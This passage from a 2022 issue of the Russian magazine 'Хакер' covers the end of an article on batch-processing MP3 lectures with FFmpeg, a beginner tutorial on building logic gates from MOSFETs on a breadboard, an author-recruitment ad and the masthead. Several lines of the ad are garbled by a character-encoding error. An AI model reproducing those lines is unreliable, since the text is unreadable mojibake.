ляющие ведущие нули к имени файла, если таковой отсутствует в папке SRC.
Если отсутствует файл и с трехразрядным номером, то будет выдано сооб‐
щение об ошибке.
  В случае успеха в переменные SRCFN и TGTFN записываются полные имена
входного и выходного аудиофайлов, значения которых используются в коман‐
дной строке FFmpeg. Командная строка получилась довольно длинной, и, что‐
бы разбить ее на части, пришлось воспользоваться символом экранирования
перевода  строки, роль  которого  в  командной  строке Windows  играет
не обратная наклонная черта \, как можно было бы подумать, а крышка ^.
   Параметры командной строки FFmpeg должны быть понятны из предыду‐
щих примеров. Разве что может возникнуть резонный вопрос, откуда возь‐
мутся значения переменных: имя файла с изображением обложки %COVER%,
частота дискретизации %FQ%, скорость потока %BR% и количество аудиодо‐
рожек %AC%. Действительно, их надо определить в начале сценария, дополнив
блок инициализации переменных окружения строками


SET FFMPEG="%ProgramFiles%\ImageMagick-7.1.0-Q8\ffmpeg.exe"
SET COVER=SRC\cover.jpg
SET FQ=22050
SET BR=32k
SET AC=1

Получившийся сценарий я применил для обработки аудиозаписей лекций
цикла «Восток (Лекторий ВШЭ)», стереофайлы которых с частотой дискре‐
тизации 44 100 Гц при  скорости потока 128 Кбит занимали на  дис‐
ке 877 Мбайт. Объем преобразованных файлов уменьшился до 219 Мбайт (то
есть примерно в четыре раза), а тембр речи лекторов субъективно даже улуч‐
шился.





        Результат аннотирования MP3-файлов с аудиозаписями лекций


УЛУЧШЕНИЕ СЦЕНАРИЯ
По большому счету поставленную в этой статье задачу уже можно считать
решенной. Однако, как известно, начав программировать (пусть даже на язы‐
ке сценариев), потом очень трудно остановиться. В описании тегов ID3 мож‐
но обнаружить, что допускается нумерация трека в формате "i/n", где i —
порядковый номер  трека, а n — общее количество треков в альбоме.
Почему бы не воспользоваться арифметическими способностями инструкции
SET и не подсчитать это количество, чтобы формировать тег номера в рас‐
ширенном формате?
   Конечно, это потребует еще одной переменной для подсчета треков
и дополнительного прохода по информационному файлу с помощью инструк‐
ции FOR с вызовом подпрограммы, выполняющей инкрементирование зна‐
чения переменной для каждой обнаруженной записи об аудиофайле.
   Добавим в блок инициализации переменных строку


SET TOTAL=0

А после первой инструкции FOR, выполняющей инициализацию альбомных
переменных, добавим строку для подсчета треков:


FOR /F "eol== tokens=1 delims=~" %%I IN (%ID3TAGS%) DO SET /A TOTAL=
TOTAL+1

Теперь можно расширить блок печати информации об обрабатываемом аль‐
боме строкой


ECHO Треков......... %TOTAL%

Осталось  в  командной  строке FFmpeg  заменить  назначения  ID3-тега
с номером трека на -metadata track="%1/%TOTAL%". С этого момента сце‐
нарий начнет аннотировать MP3-файлы номером трека в расширенном фор‐
мате.


        WWW

                      Здесь можно загрузить исходные данные и код,
                          использованные в статье.



ЗАКЛЮЧЕНИЕ
В  результате  проделанной  работы мы  получили  удобный  инструмент
для  пакетной  обработки  аудиофайлов. Если  принять во внимание, что
FFmpeg умеет еще и обрабатывать видеофайлы и файлы с изображениями,
а сценарий автоматизации без особых проблем адаптируется для решения
других подобных задач, то инструмент этот можно назвать универсальным.
При этом графическая оболочка не скрывает от нас возможностей базовой
утилиты, а для программирования достаточно штатного текстового редактора
операционной системы.
GEEK

 ЦИФРОВАЯ
ЭЛЕКТРОНИКА
    С САМОГО НАЧАЛА

         СОБИРАЕМ СХЕМЫ
      НА MOSFET-ТРАНЗИСТОРАХ





                                                  prostorosty
                                                   I'm just a TechnoFreak.
                                            7753313vv@gmail.com




Электроника и схемотехника — две очень интересные науки.
С помощью микросхем, транзисторов и других устройств
цифровой логики ты можешь у себя дома спроектировать
и собрать самые разные электронные приборы. Ведь нас‐
тоящий мужчина в своей жизни должен посадить дерево,
построить дом  и... научиться собирать цифровые схемы
на MOSFET-транзисторах!


С первыми двумя проектами, думаю, сам справишься, а вот с последним раз‐
беремся вместе в этой статье. Также сегодня ты узнаешь (или вспомнишь)
о видах сигналов, об основах алгебры логики и об электронных компонентах.
    Человеку, решившему в наш просвещенный век собрать электронное
устройство,  представлен огромный выбор  микроконтроллеров. Начиная
от всем известной и популярной Arduino, на которой собирают практически
все — от карманных метеостанций до небольших ракет, и заканчивая про‐
мышленными контроллерами SIMATIC.
  Но что внутри у этих контроллеров? Для программиста это может быть
полной загадкой. Если ты когда‑нибудь разбирал электронное устройство
и задавался вопросом «Как и почему оно работает? Для чего нужны все эти
электронные компоненты и микросхемы?», то эта статья для тебя.


ТЕОРИЯ
Без теоретической части не может обойтись ни одно техническое направле‐
ние науки. Схемотехника не исключение, так что давай перед практическим
созданием цифровых схем разберемся в ее принципах.


Нули и единицы
Ты наверняка слышал о двоичном коде и видел легендарный «цифровой
дождь» из не менее легендарной «Матрицы». В действительности компьюте‐
ры и другие вычислительные устройства оперируют не потоками символов,
а нулями и единицами. Из них и состоит двоичная система.
  Но почему в микроэлектронике используются именно эти, на первый
взгляд очень громоздкие и неудобные числа, а не, например, десятичная сис‐
тема счисления, к которой мы все привыкли? Ведь человеку было бы гораздо
проще воспринимать их!
  Не все, что удобно для человека, будет удобно компьютеру. Ответ кроется
в самих нулях и единицах. Дело в том, что для реализации двоичной системы
требуется только два исходных состояния: логические единица и ноль, то
есть истина и ложь соответственно. Эти состояния очень легко создать, нап‐
ример если условиться, что напряжение высокое (HIGH) равно 1, а низкое
(LOW) равно 0.
  А еще  благодаря использованию  двоичной  системы для  различных
логических операций в компьютерах используется булева алгебра или, если
по‑русски, алгебра логики (о ней расскажу чуть позже).


Цифра побеждает!
Существуют два основных вида сигналов — аналоговый и цифровой. Пер‐
вый — это сигнал, который непрерывно меняется в диапазоне от минималь‐
ного до максимального, в зависимости от подаваемого с источника питания
напряжения. Отличный пример аналогового сигнала — музыка в колонках
твоего компьютера. Из динамиков колонок и других аудиоустройств звук
извлекается за счет вибраций диффузора (подвижного элемента в колонке).
Во время проигрывания музыки электрический сигнал, подаваемый на диф‐
фузор,  непрерывно  меняется. Если замерить  этот  сигнал с помощью
осциллографа, мы увидим такой график.





                       График аналогового сигнала

Цифровой сигнал является импульсным, то есть его значения меняются скач‐
ком между заданными параметрами. Используя двоичную систему, мы можем
представить двоичный ноль в качестве самого низкого напряжения из воз‐
можных — 0 В, а единицу — напряжением питания, например батарейки
«Крона» (9 В). Таким образом, чтобы передать число в двоичной системе,
нужно всего лишь передать правильную последовательность электрических
импульсов. Например, число 10101 (в десятичной 21) можно изобразить
в виде такой последовательности импульсов.





                         Число в цифровом сигнале

Передавать и обрабатывать данные аналоговым сигналом гораздо труднее,
чем цифровым. Ведь разница между нулем и единицей легко различима.
А еще цифровой сигнал более помехоустойчив. Это главные причины, почему
цифровой сигнал в электронике вытеснил аналоговый.


Алгебра логики
Как и обещал, сейчас разберемся с некоторыми из основных операций
булевой алгебры, ведь именно на них и работает вся логика электронных
устройств.


             INFO

                          Чтобы теоретически продемонстрировать работу
                          логических   функций,   используются   таблицы
                          истинности, которые наглядно показывают соот‐
                           ветствие изначальных данных и преобразованных
                          логических сигналов.



NOT
Вентиль НЕ именуется инверсией. Если ты знаком с этим словом, то навер‐
няка уже догадался, что эта операция «переворачивает» значение сигнала.
В алгебре логики инвертированный сигнал обозначается чертой сверху. Таб‐
лица истинности у этого вентиля очень простая:





В логических схемах NOT показывают с помощью такого блока.





                         NOT


AND
Этот блок логического И в информатике называется конъюнкцией и обоз‐
начается знаком & (иногда знаком умножения *). В этом вентиле единица
на выходе появляется только тогда, когда все его входы принимают значение
истины. Вид блока и таблица истинности у конъюнкции такие.





                         AND





Заметно, что по сравнению с инверсией количество входов увеличилось,
от этого также увеличилось количество возможных исходов. Чем больше
у  логической  операции  входных  переменных, тем  больше ее  таблица
истинности.


OR
ИЛИ в информатике обозвали дизъюнкцией, она обозначается символом V
(иногда + или ||). Единица на выходе появится, когда истина будет хотя бы
на одном из входов.





NOR
Вентиль ИЛИ‑НЕ, как можно догадаться, — это инвертированное ИЛИ. Зна‐
чение его выхода — это выход дизъюнкции после прохода через вентиль НЕ.
Единица на его выходе появится только тогда, когда на всех его входах будет
логический ноль. NOR в таблицах истинности обозначается чертой сверху
над операцией логического ИЛИ.





                       NOR





NAND
Вентиль И‑НЕ, аналогично предыдущему, представляет собой инвертирован‐
ное И. Он выдает единицу на выходе, когда хотя бы на одном из входов есть
логический ноль. Записывается NAND добавлением черты сверху над опе‐
рацией конъюнкции.





                        NAND





НЕКОТОРЫЕ ЭЛЕКТРОННЫЕ КОМПОНЕНТЫ
Перед тем как перейти к самим транзисторам, давай поговорим о таких важ‐
ных компонентах любой цифровой схемы, как резистор и диод.


Резистор
Чаще всего в электрических схемах используется такой элемент, как резис‐
тор. Резистор можно представить как сопротивление в чистом виде. Для чего
же он может использоваться? К примеру, если в нашей цепи при конкретном
напряжении необходимо обеспечить определенную силу тока, достаточно
вычислить по закону Ома нужное сопротивление и установить в нужном месте
постоянный резистор. Схему и внешний вид постоянного резистора ты
можешь увидеть на фото снизу.





                     Схема и внешний вид резистора


             INFO

                           Закон Ома — один из основных законов электри‐
                             чества. В схемотехнике и электронике обычно он
                            используется для того, чтобы  рассчитать под‐
                     ходящее сопротивление элементов электричес‐
                         ких цепей. Формула, выражающая этот закон,
                          выглядит так: R = U/I, где R — сопротивление, U —
                         напряжение, I — сила тока.


Существуют разные виды резисторов, которые могут изменять свое соп‐
ротивление в зависимости от разных условий. Реостат изменяет сопротив‐
ление от нуля до установленного максимального значения, фоторезистор
изменяет сопротивление в зависимости от уровня освещения, а термистор,
как ты догадываешься, от температуры. Но нас интересует самый рас‐
пространенный вид резисторов — постоянный.
   У постоянного резистора нет полярности, а это значит, что его контакты
абсолютно равнозначны и нет разницы, в какой последовательности и какой
стороной резистор подключать в цепь. На фото ты мог заметить цветные
полоски на его корпусе. С их помощью ты можешь определить номинал соп‐
ротивления резистора.
   Если на резисторе всего четыре полосы, то первые две полоски (если все‐
го полос пять, то первые три) обозначают основание числа количества омов,
третья — множитель в степенях десяти. Сопротивление может быть просто
в омах (множитель 10^0), в килоомах (множитель 10^3), мегаомах (мно‐
житель 10^6) и так далее. Последняя полоса обозначает точность в процен‐
тах. На фото — таблица с расшифровкой значений разных цветов.





          Определение номинала резистора по цветным полоскам

Но тебе совершенно необязательно самому определять номинал, высматри‐
вая в таблице нужные цвета. Для таких расчетов существуют готовые каль‐
куляторы. Достаточно просто выбрать количество полос и вписать цвета.


Диод
Диод — это фактически аналог ниппеля, но для электричества. У диода,
в отличие от резистора, полярность есть и играет немаловажную роль. Его
контакты, электроды, называются анод (+) и катод (-). Ток в диоде проходит
только от анода к катоду. Если подключить диод неправильно, то ток через
него течь просто не будет. Определить катод поможет полоска на корпусе
диода.





                       Схема и внешний вид диода

Говоря о диоде, нельзя не упомянуть светодиод. Эта надежная и долговечная
«лампочка» работает так же, как и обычный диод, пропуская ток только
от анода к катоду, но при этом она еще и излучает свет. Одна из «ног» све‐
тодиода длиннее, она и есть положительный электрод. Также над катодом
располагается засечка на линзе.





                     Схема и внешний вид светодиода


           WARNING

                    Не торопись подключать диод или светодиод нап‐
                    рямую к батарейке, ведь если через эти элемен‐
                      ты пройдет слишком большой ток, на который они
                      не рассчитаны, то произойдет короткое замыка‐
                      ние и случится возгорание. Чтобы этого избе‐
                         жать, в цепь надо последовательно подключить
                      уже  изученный нами  резистор. Максимальный
                        допустимый ток для самого распространенного
                            светодиода, продающегося в качестве электрон‐
                        ного компонента, равен 30 мА, а минимальный,
                           которого достаточно для свечения, нескольким
                         миллиамперам.  На   практике,  если  будешь
                          использовать светодиод на 20 мА и питать его
                         от 5 В, используй резистор с сопротивлением
                         от 150 до 360 Ом.



ДА КТО ТАКОЙ ЭТОТ ВАШ «МОСФЕТ»?
Как ты уже понял, главный элемент в наших схемах — это MOSFET-тран‐
зистор, или, как его еще называют, МОП‑транзистор. Разновидностей тран‐
зисторов великое множество, но для нас сегодня важен именно он. MOSFET
расшифровывается как Metal-Oxide-Semiconductor  Field  Effect  Transistors,
металл‑окисел‑полупроводник полевой транзистор. Собственно, первые три
слова — это и есть МОП. Эти аббревиатуры обозначают структуру и матери‐
алы, из которых электронный компонент изготовлен.
   Транзистор — главный «кирпичик» в электронных схемах самых невообра‐
зимых масштабов. Это изготовленный из полупроводников электронный при‐
бор, который при определенных условиях начинает пропускать через себя
электрический ток. В зависимости от этих условий ток, протекающий через
транзистор, может увеличиваться или уменьшаться, а также может прекратить
идти совсем.
   МОП‑транзисторы бывают двух видов — p-канальные и n-канальные.





          Схемы p-канального и n-канального МОП‑транзисторов

Если посмотреть на условное обозначение, то можно заметить, что рабочих
контактов у полевого транзистора три, они называются source, drain и gate (в
русскоязычной интерпретации «исток», «сток» и «затвор»). Говоря очень
простым языком, MOSFET можно представить как некую «электронную кноп‐
ку» или электронный ключ, только ток начинает протекать между истоком
и стоком не при нажатии, а при подаче нужного напряжения на затвор,
которое отпирает транзистор. А когда напряжение запирает MOSFET, ток течь
прекращает.
   Буквы n и p в названиях видов транзисторов обозначают полупровод‐
никовый материал, из которых они сделаны. Разница между ними такая: n-
канальный транзистор отпирается напряжением, соответствующим уже зна‐
комой нам логической единицей, а p-канальный — напряжением, равным
логическому нулю.
   Выбрать подходящий транзистор в наше время очень просто. Несколько
десятков лет назад для того, чтобы определить тип транзистора, радиолю‐
бителю требовалось прошерстить тома справочников. Сейчас тебе достаточ‐
но прочитать на корпусе транзистора его номер и забить его в поисковик.
Первым же результатом, скорее всего, будет ссылка на даташит — документ
с техническими характеристиками.
  Для нас главное в этом документе — найти пометку MOSFET или MOS
(чтобы убедиться, действительно ли это тот транзистор, который нам нужен),
а также распиновку транзистора. Обычно названия контактов подписываются
первыми буквами, расположенными около ног транзистора на его фотог‐
рафии.


                                     Продолжение статьи →
                                   ← НАЧАЛО СТАТЬИGEEK

        ЦИФРОВАЯ
       ЭЛЕКТРОНИКА
    С САМОГО НАЧАЛА
                  СОБИРАЕМ СХЕМЫ НА MOSFET-
                                ТРАНЗИСТОРАХ





НУ НАКОНЕЦ-ТО — СБОРКА СХЕМ!
Собирать электрические схемы можно при помощи пайки электронных ком‐
понентов на монтажной плате, но для этого необходимы специальное обо‐
рудование и навыки, без которых пайка превращается в опасное занятие.
О тонкостях пайки я, возможно, расскажу в одной из следующих статей,
а сегодня мы будем собирать схемы на беспаечной макетной плате, извес‐
тной также как «бредборд» (breadboard).
   Бредборды бывают разных форм и размеров, но смысл работы у них
похожий. Провода и контакты компонентов  легко  вставляются в ячейки
и надежно там  крепятся. Если подключение окажется неправильным, то
ничего перепаивать не нужно, достаточно просто переставить контакт в дру‐
гую ячейку. Вот такой внешний вид и внутреннее устройство у стандартного
небольшого бредборда.





            Внешний вид и внутреннее устройство бредборда


             INFO

                   В переводе с английского breadboard дословно
                           означает «доска для резки хлеба». Давным‑давно,
                             когда о современных макетных и монтажных пла‐
                          тах не шло и речи, а электронные компоненты
                     были далеко не такими компактными, как сейчас,
                         древние радиолюбители тоже хотели собирать
                            прототипы  своих схем с возможностью  легко
                      и быстро разбирать и переставлять компоненты.
                    Они  придумали  вбивать  гвозди в деревянные
                         хлебные доски и на них накручивать ножки элек‐
                          тронных компонентов. Со временем бредборды
                          перестали быть хлебными досками, но название
                            осталось.



Сборка вентиля NOT на МОП-транзисторах
Схемы мы начнем собирать с самого простого в сборке вентиля НЕ. Так
как мы уже изучили обозначения электронных компонентов, тебе будет легко
собрать самому электронную схему по ее чертежу, по которому сразу видно,
что куда подключать.
   Вот список компонентов, которые понадобятся для этой схемы:
 • один p-канальный MOSFET-транзистор;
 • один n-канальный MOSFET-транзистор;
 • два резистора с сопротивлением от 150 до 360 Ом;
 • два светодиода.

Ниже ты можешь увидеть принципиальную схему инвертора, которая наг‐
лядно показывает, как NOT переворачивает сигнал.





                      Принципиальная схема инвертора

В схеме инвертора используются оба вида транзисторов. Для создания
на выходе единицы p-канальный транзистор выбран потому, что он способен
выдать ее практически без потерь по напряжению, в отличие от n-канального,
который, в свою очередь, четко формирует ноль на выходе.
   Если добавить в схему два светодиода, один из которых подключен к плю‐
су питания, а другой к минусу, то мы получим схему, где, подав на вход низкий
сигнал, мы получим высокий, от которого загорится светодиод, подключен‐
ный к минусу, и наоборот.





                               Инвертор 2

При подаче логической единицы верхний p-канальный транзистор закрыт,
а нижний n-канальный открыт, из‑за чего он дает на выходе 0 В. Цепь замыка‐
ется, и верхний светодиод загорается. При подаче нуля открыт p-канальный
MOSFET, который выдает на выходе четкую единицу.
   Собранный на бредборде вентиль NOT выглядит как на фото.





                       Инвертор‑пробник на макетке


NOR на MOSFET-транзисторах
Следующая несложная схема — ИЛИ‑НЕ. Для нее нам потребуется в два раза
больше транзисторов, чем для предыдущей:
 • два p-канальных MOSFET-транзистора;
 • два n-канальных MOSFET-транзистора;
 • резистор с сопротивлением от 150 до 360 Ом;
 • светодиод.

Таблица истинности — один из главных инструментов при проектировании
схем. Еще раз посмотрев на таблицу ИЛИ‑НЕ, видим, что единица на выходе
будет только в том случае, если на обоих входах логический ноль. Сделать
проверку такого условия можно с помощью последовательного подключения
двух p-канальных транзисторов, которые, как нам уже известно, отлично фор‐
мируют единицу на выходе. При таком подключении если на входах обоих
транзисторов будет ноль, то через них протечет ток. Но если хотя бы один
из них будет закрыт, то ток не сможет течь к конечному выходу всей схемы.





         Последовательное подключение p-канальных транзисторов

Теперь смотрим в таблицу истинности и видим, что логический ноль на ее
выходе появляется тогда, когда хотя бы на одном из входов уровень нап‐
ряжения высокий — HIGH. Электронный прибор, открывающийся единицей
и передающий на выход ноль, собирается однозначно на n-канальных тран‐
зисторах. Собрать такой прибор легко при помощи параллельного подклю‐
чения двух n-канальных транзисторов, соединив их стоки как общий выход,
а истоки соединить и подключить к земле, то есть к минусу питания. Таким
образом, единица на любом из входов транзисторов откроет его, и ток
потечет от минуса к выходу.





            Параллельное подключение n-канальных транзисторов

Соединив вместе две предыдущие схемы, мы получим рабочий вентиль
ИЛИ‑НЕ на МОП‑транзисторах.





                              Схема ИЛИ‑НЕ





                   ИЛИ‑НЕ на макетной плате


Схема NAND на транзисторах
Для сборки этой схемы нам потребуются те же самые компоненты, что и для
предыдущей.
   Заглянув в таблицу истинности, видим, что единица на выходе этой схемы
создается при наличии хотя бы на одном из входов логического нуля. Как мы
уже поняли, единица на выходе формируется с помощью p-канальных тран‐
зисторов, условие «хотя бы на одном» реализуется с помощью параллель‐
ного подключения.
   Низкий уровень напряжения (LOW) на выходе создается при условии, что
на всех входах вентиля HIGH. Ноль мы формируем n-канальными транзисто‐
рами, а строгое условие «если на всех входах» реализуем с помощью пос‐
ледовательного подключения этих транзисторов.
  В итоге, собрав две комбинации воедино, получаем такую схему.





                               Схема И‑НЕ





                     И‑НЕ на макетной плате


Схемы OR и AND на полевых транзисторах
Если сравнить таблицы истинности ИЛИ‑НЕ и ИЛИ, можно заметить, что зна‐
чения их выходов взаимно инвертированы. Это значит, что вентиль NOR мы
можем превратить в OR, просто добавив к выходу вентиль NOT. Также этот
способ  работает  в  обратную  сторону: ИЛИ  можно  легко  превратить
в ИЛИ‑НЕ.
   Совместив NOR и инвертор, получаем такую схему.





                               Схема ИЛИ





                  ИЛИ на макетной плате

Аналогичным образом инвертируя NAND, мы превращаем его в логическое
И.





                                 Схема И





                   И на макетной плате


ВЫВОДЫ
В этой статье мы разобрали создание самых базовых блоков цифровых схем.
Конечно, это очень малая часть такой обширной темы, как электроника.
К тому же у изученных нами вентилей может быть и три входа, и четыре, а то
и  больше. Все  это  усложняет  самостоятельное  проектирование схем
логических элементов. Подводя итог, можно выделить несколько правил
и советов по созданию вентилей цифровой логики на МОП‑транзисторах:
 • На p-канальных транзисторах реализуются электрические цепи, в которых
   совокупность входных сигналов приводит в единице на выходе.
 • На n-канальных транзисторах создаются цепи, в которых совокупность
   входных сигналов формирует низкое напряжение на выходе.
 • Строгое условие «если на всех входах схемы находится определенный
   уровень напряжения» создается с помощью последовательного подклю‐
   чения транзисторов.
 • Условие «хотя бы на одном входе» создается с помощью параллельного
   подключения транзисторов.

Изучив схемотехнику, ты сможешь разобраться в устройстве современной
электроники, лучше понять, как работает твой компьютер, и другие сложные
на первый взгляд вещи!
   СТАНЬ АВТОРОМ
     «ХАКЕРА»!


«Хакеру» нужны новые авторы, и ты можешь стать одним
из них! Если тебе интересно то, о чем мы пишем, и есть
желание исследовать эти темы вместе с нами, то не упусти
возможность вступить в ряды наших авторов и получать
за это все, что им причитается.


 • Àâòîðû ïîëó÷àþò äåíåæíîå âîçíàãðàæäåíèå. Размер  зависит
   от сложности и уникальности темы и объема проделанной работы (но
   не от объема текста).
 • Íàøè àâòîðû ÷èòàþò «Õàêåð» áåñïëàòíî: каждая опубликованная
   статья приносит месяц подписки и значительно увеличивает личную скид-
    ку. Уже после третьего раза подписка станет бесплатной навсегда.

Кроме того, íàëè÷èå ïóáëèêàöèé — ýòî îòëè÷íûé ñïîñîá ïîêàçàòü
ðàáîòîäàòåëþ è êîëëåãàì, ÷òî òû â òåìå. А еще мы планируем запуск
англоязычной версии, так что ó òåáÿ áóäåò øàíñ áûòü óçíàííûì è çà
ðóáåæîì.
  И конечно, ìû âñåãäà óêàçûâàåì â ñòàòüÿõ èìÿ èëè ïñåâäîíèì
àâòîðà. На сайте ты можешь сам заполнить характеристику, поставить фото,
написать что-то о себе, добавить ссылку на сайт и профили в соцсетях. Или,
наоборот, не делать этого в целях конспирации.


ß ÒÅÕÍÀÐÜ, À ÍÅ ÆÓÐÍÀËÈÑÒ. ÏÎËÓ×ÈÒÑß ËÈ Ó ÌÅÍß ÍÀÏÈÑÀÒÜ
ÑÒÀÒÜÞ?
Главное в нашем деле — знания по теме, а не корочки журналиста. Знаешь
тему — значит, и написать сможешь. Не умеешь — поможем, будешь сом-
неваться — поддержим, накосячишь — отредактируем. Не зря у нас работает
столько редакторов! Они не только правят буквы, но и помогают с темами
и форматом и «причесывают» авторский текст, если в этом есть необ-
ходимость. И конечно, перед публикацией мы согласуем с автором все прав-
ки и вносим новые, если нужно.


ÊÀÊ ÏÐÈÄÓÌÀÒÜ ÒÅÌÓ?
Темы для статей — дело непростое, но и не такое сложное, как может
показаться. Стоит начать, и ты наверняка будешь придумывать темы одну
за другой!
  Первым делом задай себе несколько простых вопросов:
 • «Ðàçáèðàþñü ëè ÿ â ÷åì‑òî, ÷òî ìîæåò çàèíòåðåñîâàòü äðóãèõ?»
   Частый случай: люди делают что-то потрясающее, но считают свое
   занятие вполне обыденным. Если твоя мама и девушка не хотят слушать
   про реверс малвари, сборку ядра Linux, проектирование микропроцес-
   соров или хранение данных в ДНК, это не значит, что у тебя не найдется
   благодарных читателей.
 • «Áûëè ëè ó ìåíÿ â ïîñëåäíåå âðåìÿ èíòåðåñíûå ïðîåêòû?» Если
   ты ресерчишь, багхантишь, решаешь crackme или задачки на CTF, если ты
   разрабатываешь  что-то необычное или даже просто настроил себе
   какую-то удобную штуковину, обязательно расскажи нам! Мы вместе при-
   думаем, как лучше подать твои наработки.
 • «Çíàþ ëè ÿ êàêóþ‑òî èñòîðèþ, êîòîðàÿ êàæåòñÿ ìíå êðóòîé?»
  Попробуй вспомнить: если ты буквально недавно рассказывал кому-то
  о чем-то очень важном или захватывающем (и связанным с ИБ или ИТ), то
   с немалой вероятностью это может быть неплохой темой для статьи.
  Или как минимум натолкнет тебя на тему.
 • «Íå ïîäìå÷àë ëè ÿ, ÷òî â Õàêåðå óïóñòèëè ÷òî‑òî âàæíîå?» Если
  мы о чем-то не писали, это могло быть не умышленно. Возможно, просто
   никому не пришла в голову эта тема или не было человека, который
   взял бы ее на себя. Кстати, даже если писать сам ты не собираешься, под-
   кинуть нам идею все равно можно.


Óãîâîðèëè, êàêîâ ïëàí äåéñòâèé?
 1. Придумываешь актуальную тему или несколько.
 2. Описываешь эту тему так, чтобы было понятно, что будет в статье и зачем
   ее кому-то читать. Обычно достаточно рабочего заголовка и нескольких
   предложений (pro tip: их потом можно пустить на введение).
 3. Выбираешь редактора и отправляешь ему свои темы (можно главреду —
   он разберется). Заодно неплохо бывает представиться и написать пару
   слов о себе.
 4. С редактором согласуете детали и сроки сдачи черновика. Также он выда-
   ет тебе правила оформления и отвечает на все интересующие вопросы.
 5. Пишешь статью в срок и отправляешь ее. Если возникают какие-то проб-
   лемы, сомнения или просто задержки, ты знаешь, к кому обращаться.
 6. Редактор читает статью, принимает ее или возвращает с просьбой
   доработать и руководством к действию.
 7. Перед публикацией получаешь версию с правками и обсуждаешь их
   с редактором (или просто даешь добро).
 8. Дожидаешься выхода статьи и поступления вознаграждения.


TL;DR
Если хочешь публиковаться в «Хакере», придумай тему для первой статьи
и предложи редакции.
   №04 (277)

            Андрей Письменный        Илья Русанен            Алексей Глазков
               Главный редактор       Зам. главного редактора     Выпускающий редактор
               pismenny@glc.ru        по техническим вопросам          glazkov@glc.ru
                                            rusanen@glc.ru
                                        Евгения Шарипова
                                           Литературный редактор


                         РЕДАКТОРЫ РУБРИК

            Андрей Письменный         Евгений Зобнин        Валентин Холмогоров
               pismenny@glc.ru              zobnin@glc.ru           valentin@holmogorov.ru
               Татьяна Чупрова            Марк           Иван «aLLy» Андреев
                chuprova@glc.ru       Бруцкий-Стемпковский    iam@russiansecurity.expert
                                              brutsky@glc.ru


                          MEGANEWS

                                     Мария Нефёдова
                                            nefedova@glc.ru


                                  АРТ

                                      yambuto
                                      yambuto@gmail.com


                             РЕКЛАМА

                                            Анна Яковлева
                                        Директор по спецпроектам
                                             yakovleva.a@glc.ru


                    РАСПРОСТРАНЕНИЕ И ПОДПИСКА

                          Вопросы по подписке:       ​Вопросы по материалам:
                                 lapina@glc.ru                support@glc.ru​





Адрес редакции: 125080, город Москва, Волоколамское шоссе, дом 1, строение 1, этаж 8, помещение IX, комната 54, офис 7. Издатель: ИП
Югай Александр Олегович, 400046, Волгоградская область, г. Волгоград, ул. Дружбы народов, д. 54. Учредитель: ООО «Медиа Кар»​ ​125080,
город Москва, Волоколамское шоссе, дом 1, строение 1, этаж 8, помещение IX, комната 54, офис 7. Зарегистрировано в Федеральной службе
по надзору в сфере связи, информационных технологий и массовых коммуникаций (Роскомнадзоре), свидетельство ​Эл № ​ФС77-​67001 от ​30.​
08.​2016 года. Мнение редакции не обязательно совпадает с мнением авторов. Все материалы в номере предоставляются как информация
к размышлению. Лица, использующие данную информацию в противозаконных целях, могут быть привлечены к ответственности. Редакция
не несет ответственности за содержание рекламных объявлений в номере. По вопросам лицензирования и получения прав на использование
редакционных материалов журнала обращайтесь по адресу: xakep@glc.ru. © Журнал «Хакер», РФ, 2022